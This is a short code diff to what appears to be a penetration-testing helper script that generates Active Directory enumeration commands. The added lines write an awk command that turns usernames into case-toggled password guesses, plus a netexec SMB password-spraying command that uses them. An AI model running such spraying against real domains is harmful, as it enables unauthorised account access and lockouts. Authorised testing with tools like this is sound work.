@@ -60,6 +60,10 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
             f.write("# Try your users list as a password list\n")
             f.write(f"netexec smb {domain} -u users.txt -p users.txt --continue-on-success\n\n")
 
+            f.write("# Generate case-toggled password list from usernames\n")
+            f.write("awk '{print toupper(substr($0,1,1)) substr($0,2); print tolower(substr($0,1,1)) substr($0,2)}' users.txt > toggled_passwords.txt\n")
+            f.write(f"netexec smb {domain} -u users.txt -p toggled_passwords.txt --continue-on-success\n\n")
+
         #AS-REP search when creds are available
         if has_creds:
             f.write(f"# AS-REP search when creds are available\n")
